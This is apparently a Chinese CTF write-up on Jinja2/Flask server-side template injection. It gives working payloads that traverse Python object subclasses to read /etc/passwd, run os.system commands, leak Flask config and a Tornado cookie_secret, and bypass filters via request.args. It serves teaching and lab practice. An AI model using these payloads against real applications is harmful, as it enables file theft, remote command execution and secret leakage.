## python_template_injection

在Jinja2[模板引擎](https://so.csdn.net/so/search?q=%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E&spm=1001.2101.3001.7020)中，{{}}是变量包裹标识符。{{}}并不仅仅可以传递变量，还可以执行一些简单的[表达式](https://so.csdn.net/so/search?q=%E8%A1%A8%E8%BE%BE%E5%BC%8F&spm=1001.2101.3001.7020)。

## 判断有无模板注入

http://220.249.52.133:53362/{{7+7}}  
​也可能有带参数  
http://220.249.52.133:53362/?name={{7+7}}

![1653106052_6288658473b39aa024628.png!small?1653106277941](https://image.3001.net/images/20220521/1653106052_6288658473b39aa024628.png!small?1653106277941)

## 查看全局变量

    
    
    http://220.249.52.133:53362/{{config}}

![1653106059_6288658b88a70d3ede27d.png!small?1653106285097](https://image.3001.net/images/20220521/1653106059_6288658b88a70d3ede27d.png!small?1653106285097)

文件包含：是通过python的对象的继承来一步步实现文件读取和命令执行的的。思路：找到父类<type
‘object’>–>寻找子类–>找关于命令执行或者文件操作的模块。  

### 几个魔术方法

    
    
    __class__返回类型所属的对象  
    __mro__  返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。  
    __base__ 返回该对象所继承的基类//__base__和__mro__都是用来寻找基类的  
    ​  
    __subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表  
    __init__类的初始化方法  
    __globals__对包含函数全局变量的字典的引用

## 寻找可用引用

    
    
    {{''.__class__.__mro__[2].__subclasses__()}}

![1653106071_628865972daf0b593f8c5.png!small?1653106296767](https://image.3001.net/images/20220521/1653106071_628865972daf0b593f8c5.png!small?1653106296767)

> 可以看到第40个（从0开始）
>
> 有一个 **type file** 类型(可以进行文件读取)
>
>  
>
>
> 可以看到第71个（从0开始）
>
> 有一个 **< class ‘site._Printer’>**类型（可以进行命令执行）

### 文件读取

    
    
    {{ [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}  
    ​  
    //[40]是typefile类型出现位置（从0开始的位置）

![1653106098_628865b2372faf8aa495a.png!small?1653106323790](https://image.3001.net/images/20220521/1653106098_628865b2372faf8aa495a.png!small?1653106323790)

### 命令执行

    
    
    //Windows操作系统  
    {{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}  
    //Linux操作系统  
    {{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')}}  
    ​  
    //[71]为<class‘site._Printer’>出现位置

![1653106111_628865bf3daf412cbe134.png!small?1653106336677](https://image.3001.net/images/20220521/1653106111_628865bf3daf412cbe134.png!small?1653106336677)

## 获取Flag

    
    
    {{''.__class__.__mro__[2].__subclasses__()[40]('fl4g').read()}}

![1653106119_628865c7927f57df5f950.png!small?1653106345037](https://image.3001.net/images/20220521/1653106119_628865c7927f57df5f950.png!small?1653106345037)

## cookie_secret

    
    
    error?msg={{handler.settings}}  
    ​  
    aad1316c-1b1b-41fb-9295-77cfedeb9b1e

![1653106128_628865d0d91b922ad8b8a.png!small?1653106354351](https://image.3001.net/images/20220521/1653106128_628865d0d91b922ad8b8a.png!small?1653106354351)

## shrine

    
    
    /shrine/{{url_for.__globals__}}

![1653106134_628865d6d0cc282d588be.png!small?1653106360337](https://image.3001.net/images/20220521/1653106134_628865d6d0cc282d588be.png!small?1653106360337)

> 这里是代码审计，发现源码有flask.Flask
>
> app = **flask**.Flask(name) app.config[' **FLAG** '] =
> os.environ.pop('FLAG')
    
    
    /shrine/{{url_for.__globals__['current_app'].config['FLAG']}}

![1653106141_628865dd5e900603cd0d7.png!small?1653106366805](https://image.3001.net/images/20220521/1653106141_628865dd5e900603cd0d7.png!small?1653106366805)

# request绕过

> 适用于获得了flag路径的题目
    
    
    {{''[request.args.a][request.args.b][2][request.args.c]()}}?a=__class__&b=__mro__&c=__subclasses__

![1653106147_628865e35bc0b58cfa12c.png!small?1653106372935](https://image.3001.net/images/20220521/1653106147_628865e35bc0b58cfa12c.png!small?1653106372935)

通过源码提示得到路径

![1653106153_628865e923c5608ac030f.png!small?1653106378621](https://image.3001.net/images/20220521/1653106153_628865e923c5608ac030f.png!small?1653106378621)

    
    
    {{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&b=__mro__&c=__subclasses__&d=read

![1653106161_628865f19eaa11258da0b.png!small?1653106387076](https://image.3001.net/images/20220521/1653106161_628865f19eaa11258da0b.png!small?1653106387076)

